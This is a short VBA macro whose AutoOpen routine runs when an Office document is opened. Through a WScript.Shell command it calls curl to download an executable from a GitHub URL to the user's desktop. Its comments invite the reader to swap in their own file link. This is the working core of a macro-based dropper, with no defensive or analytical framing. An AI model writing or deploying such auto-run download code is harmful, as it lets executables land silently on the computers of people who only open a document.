Sub AutoOpen()


    Dim shell As Object
    Dim exeURL As String
    Dim downloadPath As String
    Dim desktopPath As String

    ' Create a Shell object
    Set shell = CreateObject("WScript.Shell")

    ' Get the desktop folder path
    desktopPath = shell.SpecialFolders("Desktop")

    ' Replace with the Google Drive sharing link for your .exe file
    exeURL = "https://github.com/RadoslavTsvetanov/Exe/raw/main/main.exe"

    ' Replace with the local path where you want to save the downloaded .exe file
    downloadPath = desktopPath & "\main.exe"
    cmd = "cmd /c curl -LOJ https://github.com/RadoslavTsvetanov/Exe/raw/main/main.exe -o """ & desktopPath & "\main.exe"""
    ' Use Shell to download the file from Google Drive using curl
    shell.Run cmd, vbNormalFocus
    
End Sub

